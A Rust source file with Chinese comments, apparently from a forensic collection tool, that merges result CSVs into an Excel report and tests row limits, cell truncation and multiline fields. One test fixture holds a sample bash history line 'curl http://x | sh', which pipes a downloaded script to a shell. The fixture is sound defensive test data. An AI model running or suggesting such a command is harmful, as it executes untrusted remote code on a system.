//! 单文件合并报告：把结果目录中全部 CSV 输出合并为一个 Excel 工作簿
//! reports/dumpall_report.xlsx，每个 sheet 对应一个采集类别（CSV 文件名），
//! 数据行原样保留（含完整路径列），便于人工定位与筛选。
//!
//! 体积与耗时控制：每 sheet 最多 MAX_ROWS_PER_SHEET 行，超限截断并在
//! 末行注明；CSV 经 csv crate 流式读取（支持引号内多行字段），单单元格
//! 超长按字符边界截断；sheet 启用 constant memory 模式（行序单调写入）。

use std::fs::File;
use std::io::BufReader;
use std::path::{Path, PathBuf};

use rust_xlsxwriter::Workbook;

use crate::error::{DumpallError, Result};
use crate::output::paths::OutputLayout;

/// 单 sheet 最大数据行数（防超大 CSV 撑爆 xlsx）。
const MAX_ROWS_PER_SHEET: u64 = 50_000;

/// 单单元格最大字符数（Excel 上限 32767，留出截断标记余量）。
const MAX_CELL_CHARS: usize = 32_000;

/// 参与合并的目录（按顺序成为 sheet 顺序）。
const SOURCE_DIRS: [&str; 6] = [
    "collection",
    "events",
    "findings",
    "runtime",
    "containers",
    "timeline",
];

/// 生成合并工作簿；返回写入的 sheet 数。
pub fn write_merged_xlsx(layout: &OutputLayout) -> Result<usize> {
    let mut workbook = Workbook::new();
    let mut sheet_count = 0usize;
    let mut used_names = std::collections::BTreeSet::new();

    for dir_name in SOURCE_DIRS {
        let dir = layout.root.join(dir_name);
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        let mut files: Vec<PathBuf> = entries
            .flatten()
            .map(|entry| entry.path())
            .filter(|path| {
                path.extension()
                    .map(|ext| ext.eq_ignore_ascii_case("csv"))
                    .unwrap_or(false)
            })
            .collect();
        files.sort();
        for path in files {
            let base = path
                .file_stem()
                .and_then(|stem| stem.to_str())
                .unwrap_or("sheet");
            let sheet_name = unique_sheet_name(&mut used_names, base);
            if add_csv_sheet(&mut workbook, &sheet_name, &path)? {
                sheet_count += 1;
            }
        }
    }

    if sheet_count == 0 {
        return Ok(0);
    }
    let target = layout.reports_dir.join("dumpall_report.xlsx");
    workbook
        .save(&target)
        .map_err(|error| {
            DumpallError::invalid_argument(
                "xlsx-report",
                format!("save merged report failed: {error}"),
            )
        })
        .map(|_| sheet_count)
}

fn unique_sheet_name(used: &mut std::collections::BTreeSet<String>, base: &str) -> String {
    // Excel sheet 名上限 31 字符，且不允许 []:*?/\
    let sanitized: String = base
        .chars()
        .map(|c| {
            if matches!(c, '[' | ']' | ':' | '*' | '?' | '/' | '\\') {
                '_'
            } else {
                c
            }
        })
        .collect();
    let mut candidate: String = sanitized.chars().take(28).collect();
    let mut suffix = 1u32;
    while used.contains(&candidate) {
        let tail = format!("_{suffix}");
        let keep = 28usize.saturating_sub(tail.len());
        candidate = format!(
            "{}{}",
            sanitized.chars().take(keep).collect::<String>(),
            tail
        );
        suffix += 1;
    }
    used.insert(candidate.clone());
    candidate
}

/// 超长单元格截断（字符边界安全）：超过 MAX_CELL_CHARS 时截到上限并追加标记；
/// 返回 None 表示无需处理。
fn clamp_cell(value: &str) -> Option<String> {
    if value.chars().count() <= MAX_CELL_CHARS {
        return None;
    }
    let mut truncated: String = value.chars().take(MAX_CELL_CHARS).collect();
    truncated.push_str("…[截断]");
    Some(truncated)
}

/// 把一个 CSV 写成一个 sheet；空 CSV（仅表头）也保留，返回是否成功写入。
fn add_csv_sheet(workbook: &mut Workbook, sheet_name: &str, path: &Path) -> Result<bool> {
    let file = File::open(path).map_err(|error| {
        DumpallError::invalid_argument(
            "xlsx-report",
            format!("open {} failed: {error}", path.display()),
        )
    })?;
    // csv crate 读取：支持引号包裹的多行字段与转义；flexible 容忍列数不齐。
    let mut reader = csv::ReaderBuilder::new()
        .has_headers(false)
        .flexible(true)
        .from_reader(BufReader::new(file));
    // constant memory 模式：行只能单调前进写入（本函数按行序写入，兼容）。
    let sheet = workbook.add_worksheet_with_constant_memory();
    sheet.set_name(sheet_name).map_err(|error| {
        DumpallError::invalid_argument(
            "xlsx-report",
            format!("sheet name {sheet_name} invalid: {error}"),
        )
    })?;
    // 冻结表头行 + 自动列宽（近似值，保证可读即可）。
    sheet.set_freeze_panes(1, 0).ok();
    let mut next_row: u32 = 0;
    let mut rows_truncated = false;
    let mut cells_truncated = 0usize;
    for record in reader.records() {
        // 读取容错：坏记录（如未闭合引号）终止本 sheet，已写入的行保留。
        let Ok(record) = record else {
            break;
        };
        if next_row as u64 >= MAX_ROWS_PER_SHEET {
            rows_truncated = true;
            break;
        }
        for (col_index, field) in record.iter().enumerate() {
            // 列数防御：xlsx 列上限 16384。
            if col_index >= 100 {
                break;
            }
            if let Some(truncated) = clamp_cell(field) {
                cells_truncated += 1;
                let _ = sheet.write_string(next_row, col_index as u16, truncated);
            } else {
                let _ = sheet.write_string(next_row, col_index as u16, field);
            }
        }
        next_row += 1;
    }
    if rows_truncated {
        let _ = sheet.write_string(
            next_row,
            0,
            format!("（截断：仅保留前 {MAX_ROWS_PER_SHEET} 行，完整数据见对应 CSV 文件）"),
        );
        next_row += 1;
    }
    if cells_truncated > 0 {
        let _ = sheet.write_string(
            next_row,
            0,
            format!("（{cells_truncated} 个超长单元格已截断至 {MAX_CELL_CHARS} 字符）"),
        );
    }
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clamp_cell_truncates_on_char_boundaries() {
        assert_eq!(clamp_cell("short"), None);
        assert_eq!(clamp_cell(&"x".repeat(32_000)), None);
        let truncated = clamp_cell(&"x".repeat(40_000)).unwrap();
        assert_eq!(truncated.chars().count(), 32_000 + "…[截断]".chars().count());
        assert!(truncated.ends_with("…[截断]"));
        // 多字节字符在字符边界截断，结果仍是合法 UTF-8。
        let wide = clamp_cell(&"汉".repeat(32_001)).unwrap();
        assert!(wide.ends_with("…[截断]"));
        assert_eq!(wide.chars().count(), 32_000 + "…[截断]".chars().count());
    }

    /// 最小 ZIP 读取器（EOCD→中央目录→本地头→数据），用于解包验证生成的 xlsx。
    fn extract_zip_entry(path: &Path, want: &str) -> String {
        use std::io::Read;
        let data = std::fs::read(path).unwrap();
        let eocd = data
            .windows(4)
            .rev()
            .position(|window| window == 0x0605_4b50u32.to_le_bytes())
            .map(|offset| data.len() - offset - 4)
            .expect("EOCD signature");
        let count = u16::from_le_bytes([data[eocd + 10], data[eocd + 11]]) as usize;
        let cd_offset =
            u32::from_le_bytes(data[eocd + 16..eocd + 20].try_into().unwrap()) as usize;
        let mut cursor = cd_offset;
        let mut seen = 0usize;
        while seen < count && data[cursor..cursor + 4] == 0x0201_4b50u32.to_le_bytes() {
            let method = u16::from_le_bytes(data[cursor + 10..cursor + 12].try_into().unwrap());
            let csize =
                u32::from_le_bytes(data[cursor + 20..cursor + 24].try_into().unwrap()) as usize;
            let name_len =
                u16::from_le_bytes(data[cursor + 28..cursor + 30].try_into().unwrap()) as usize;
            let extra_len =
                u16::from_le_bytes(data[cursor + 30..cursor + 32].try_into().unwrap()) as usize;
            let local_offset =
                u32::from_le_bytes(data[cursor + 42..cursor + 46].try_into().unwrap()) as usize;
            let name =
                String::from_utf8_lossy(&data[cursor + 46..cursor + 46 + name_len]).to_string();
            if name == want {
                let local_name_len = u16::from_le_bytes(
                    data[local_offset + 26..local_offset + 28].try_into().unwrap(),
                ) as usize;
                let local_extra_len = u16::from_le_bytes(
                    data[local_offset + 28..local_offset + 30].try_into().unwrap(),
                ) as usize;
                let start = local_offset + 30 + local_name_len + local_extra_len;
                let raw = &data[start..start + csize];
                let out = match method {
                    0 => raw.to_vec(),
                    8 => {
                        let mut decoder = flate2::read::DeflateDecoder::new(raw);
                        let mut out = Vec::new();
                        decoder.read_to_end(&mut out).unwrap();
                        out
                    }
                    other => panic!("unsupported zip method {other}"),
                };
                return String::from_utf8_lossy(&out).to_string();
            }
            cursor += 46 + name_len + extra_len;
            seen += 1;
        }
        panic!("zip entry {want} not found in {}", path.display());
    }

    #[test]
    fn sheet_names_are_unique_and_bounded() {
        let mut used = std::collections::BTreeSet::new();
        let first = unique_sheet_name(&mut used, "shell_history");
        let second = unique_sheet_name(&mut used, "shell_history");
        assert_eq!(first, "shell_history");
        assert_eq!(second, "shell_history_1");
        let long = unique_sheet_name(&mut used, &"x".repeat(64));
        assert!(long.chars().count() <= 31);
    }

    /// 引号内多行字段必须留在同一个单元格，不允许串行成多行。
    #[test]
    fn multiline_csv_field_stays_in_one_cell() {
        let root = std::env::temp_dir().join(format!(
            "dumpall-xlsx-multiline-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_millis()
        ));
        std::fs::create_dir_all(root.join("collection")).unwrap();
        std::fs::create_dir_all(root.join("reports")).unwrap();
        let csv_path = root.join("collection").join("notes.csv");
        std::fs::write(
            &csv_path,
            "id,note\n1,\"first line\nsecond line\"\n2,\"third\nline\"\n",
        )
        .unwrap();

        let mut workbook = Workbook::new();
        add_csv_sheet(&mut workbook, "notes", &csv_path).unwrap();
        let target = root.join("reports").join("out.xlsx");
        workbook.save(&target).unwrap();

        let sheet_xml = extract_zip_entry(&target, "xl/worksheets/sheet1.xml");
        // 表头 1 行 + 2 条记录（每条含多行字段）= 3 行；多行字段不得拆成新行。
        assert_eq!(sheet_xml.matches("<row").count(), 3, "{sheet_xml}");
        assert!(sheet_xml.contains("first line"));
        assert!(sheet_xml.contains("second line"));
        assert!(sheet_xml.contains("third"));
        let _ = std::fs::remove_dir_all(root);
    }

    /// 超长单元格截断到 32000 字符并追加标记，sheet 末行输出截断计数备注。
    #[test]
    fn oversized_cell_is_truncated_with_note() {
        let root = std::env::temp_dir().join(format!(
            "dumpall-xlsx-truncate-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_millis()
        ));
        std::fs::create_dir_all(root.join("collection")).unwrap();
        std::fs::create_dir_all(root.join("reports")).unwrap();
        let csv_path = root.join("collection").join("big.csv");
        std::fs::write(
            &csv_path,
            format!("a,b\nv,{}\n", "x".repeat(40_000)),
        )
        .unwrap();

        let mut workbook = Workbook::new();
        add_csv_sheet(&mut workbook, "big", &csv_path).unwrap();
        let target = root.join("reports").join("out.xlsx");
        workbook.save(&target).unwrap();

        let sheet_xml = extract_zip_entry(&target, "xl/worksheets/sheet1.xml");
        // 截断后恰好保留 32000 个 'x'（按 100 连续字符计组，规避 XML 样板中的字母 x）；
        // 原 40000 个连续字符不允许完整出现。
        assert_eq!(sheet_xml.matches(&"x".repeat(100)).count(), 320);
        assert!(!sheet_xml.contains(&"x".repeat(32_001)));
        assert!(sheet_xml.contains("…[截断]"));
        assert!(sheet_xml.contains("1 个超长单元格已截断至 32000 字符"));
        let _ = std::fs::remove_dir_all(root);
    }

    #[test]
    fn merges_csv_files_into_workbook() {
        let root = std::env::temp_dir().join(format!(
            "dumpall-xlsx-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_millis()
        ));
        let collection = root.join("collection");
        let reports = root.join("reports");
        std::fs::create_dir_all(&collection).unwrap();
        std::fs::create_dir_all(&reports).unwrap();
        std::fs::write(
            collection.join("shell_history.csv"),
            "user,home_dir,history_file,line_no,timestamp,command\nroot,/root,/root/.bash_history,1,,curl http://x | sh\n",
        )
        .unwrap();
        std::fs::write(collection.join("empty.csv"), "a,b\n").unwrap();
        let layout = OutputLayout::from_root(root.clone());
        let sheets = write_merged_xlsx(&layout).unwrap();
        assert_eq!(sheets, 2);
        let target = reports.join("dumpall_report.xlsx");
        assert!(target.is_file());
        assert!(target.metadata().unwrap().len() > 500);
        let _ = std::fs::remove_dir_all(root);
    }
}
